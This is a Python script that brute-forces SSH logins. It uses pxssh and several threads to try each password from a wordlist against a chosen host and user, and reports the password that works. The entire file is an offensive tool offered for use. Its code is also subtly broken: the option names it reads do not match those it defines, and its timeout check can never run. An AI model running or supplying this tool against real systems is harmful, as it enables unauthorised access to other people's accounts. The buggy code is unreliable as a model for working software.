#coding=utf-8

import pxssh
import optparse
import time
import threading
MaxConnections = 5
ConnectLock =  threading.BoundedSemaphore(value = MaxConnections)
Found = False
Fails = 0


def Connect(Host,User,Password,Release):
    global Found,Fails
    try:
        Ssh = pxssh.pxssh()
        Ssh.login(Host,User,Password)
        print('[+]Password Found:'+Password)
        Found = True
    except Exception as e:
        if'read_noneblocking' in str(e):
            Fails += 1
            time.sleep(5)
            Connect(Host,User,Password,False)
        elif'synchronize with original prompt' in str(e):
            time.sleep(1)
            Connect(Host,User,Password,False)
    finally:
        if Release:
            ConnectLock.release()
            

def main():
     parser = optparse.OptionParser('usage%prog '+'-H <target host> '
                                                  '-u <user> -f <password list>')   
     parser.add_option('-H', dest='TargetHost', type='string', help='specify target host')   
     parser.add_option('-f', dest='passwdFile', type='string', 
                       help='specify password file') 
     parser.add_option('-u',dest='user',type='string',help = 'specify the user' )
     (Options,args) = parser.parse_args()
     Host = Options.TargetHost__
     PasswordFile = Options.PasswordFile
     User=Options.user
     if Host == None or PasswordFile == None or User == None:
         print(parser.usage)
         exit(0)
     Fn = open(PasswordFile,'r')
     for Line in Fn.readlines():
         if Found:
             print("[*]Exiting : PasswordFound")
             exit(0)
             if Fails > 5:
                 print("[!]Exiting:Too Many Socket Timeouts")
                 exit(0)
         ConnectLock.acquire()
         Password = Line.strip('\r').strip('\n')
         print("[-]Testing:"+str(Password))
         t = threading.Thread(target = Connect,args=(Host,
                                                     User,Password,True))
         t.start()
if __name__ == "__main__":
    main()
